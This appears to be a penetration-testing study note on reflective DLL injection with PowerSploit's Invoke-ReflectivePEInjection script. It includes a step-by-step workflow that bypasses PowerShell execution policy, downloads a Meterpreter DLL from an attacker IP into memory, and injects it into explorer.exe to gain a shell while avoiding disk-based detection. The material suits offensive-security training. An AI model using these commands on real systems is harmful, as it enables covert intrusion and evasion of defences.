# **Reflective DLL Injection in PowerShell**

## 🔹 Concept

- **Reflective DLL Injection**: Technique to load a DLL directly into the memory of a process without writing it to disk.
- Achieved via **reflection**:
    - Parses a Portable Executable (PE) (DLL/EXE) entirely in memory.
    - Resolves imports (e.g., `LoadLibrary`, `GetProcAddress`) dynamically.
    - Maps sections into the target process’ address space.

This makes detection harder since no file touches disk and execution runs in-memory.

---

## 🔹 Tool: `Invoke-ReflectivePEInjection.ps1`

- Provided by **PowerSploit** (`CodeExecution` module).
- Supports **two modes**:
    1. **Local injection**: Load DLL/EXE inside the same PowerShell process.
    2. **Remote injection**: Inject DLL into a remote process (e.g., `explorer.exe`).

📌 Old Script: [PowerSploit – Invoke-ReflectivePEInjection.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1), The new one  

[BC-SECURITY/Invoke-ReflectivePEInjection.ps1](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1)

---

## 🔹 Workflow Example – Remote Injection into `explorer.exe`

1. **Bypass Execution Policy**:
    
    ```powershell
    PowerShell -Exec Bypass
    ```
    
2. **Download the DLL into memory**:
    
    ```powershell
    $bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll')
    ```
    
    - `met.dll` = Meterpreter DLL payload.
    - Stored in **byte array** (`$bytes`) → stays in memory.
3. **Get target process ID**:
    
    ```powershell
    $procid = (Get-Process -Name explorer).Id
    ```
    
    - Selects **explorer.exe** PID dynamically.
4. **Load and inject**:
    
    ```powershell
    Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
    Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
    ```
    
    ✅ DLL is now injected into `explorer.exe` without touching disk.
    

---

## 🔹 Common Use Case

- **Meterpreter DLL injection**:
    - Reflectively inject `metsrv.dll` into a process (e.g., `explorer.exe`) to establish Meterpreter shell.

---

## 🔹 Issues & Limitations

- **Windows 10 1803+ Incompatibility**:
    - Public PowerSploit version fails due to multiple `GetProcAddress` entries in `UnsafeNativeMethods`.
    - Fixes exist in forks (e.g., Empire, Charnim fork).
        
        📎 References:
        
        - [BC-Security Empire implementation](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1)
        - [PowerSploit issue #293](https://github.com/PowerShellMafia/PowerSploit/issues/293)
        - [Charnim updated version](https://github.com/charnim/Invoke-ReflectivePEInjection.ps1/blob/main/Invoke-ReflectivePEInjection.ps1)
